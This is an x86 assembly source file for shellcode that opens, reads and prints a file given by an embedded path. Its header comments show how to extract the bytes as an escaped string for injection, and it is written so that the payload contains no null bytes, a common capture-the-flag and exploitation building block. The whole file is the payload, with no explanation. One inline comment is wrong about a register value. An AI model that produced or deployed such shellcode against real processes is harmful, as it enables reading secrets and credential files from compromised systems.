#
# gcc -nostdlib -m32 -o open-read-write-x86 open-read-write-x86.s
# for i in $(objdump -d -M intel open-read-write-x86 | grep "^ " | cut -f2); do
#     echo -n "\x$i"
# done
#
# Change line 17 and line 51 simultaneously 
#
.intel_syntax noprefix
.global _start

_start:
	jmp REL_JMP
REL_CALL:
	pop edi             #
	xor eax, eax
	mov [edi + 13], al  # NUL to terminate string
	mov ebx, edi
	push eax
	pop ecx             # ecx => 0
	push 04
	pop edx             # edx => 0
	push 0x5
	pop eax             # eax => 5 (open() syscall)
	int 0x80

	mov ebx, eax        # ebx => fd
	mov ecx, edi        # ecx => buf
	push 0x7f
	pop edx             # edx => count
	push 0x3
	pop eax             # eax => 3 (read() syscall)
	int 0x80

	mov edx, eax        # edx => count
	mov ecx, edi        # ecx => buf
	push 0x1
	pop ebx             # ebx => fd (stdout)
	push 0x4
	pop eax             # eax => 4 (write() syscall)
	int 0x80

EXIT:
	xor ebx, ebx
	push 0x1
	pop eax             # eax => 1 (exit() syscall)
	int 0x80

REL_JMP:
	call REL_CALL
	.ascii "/path/to/file"
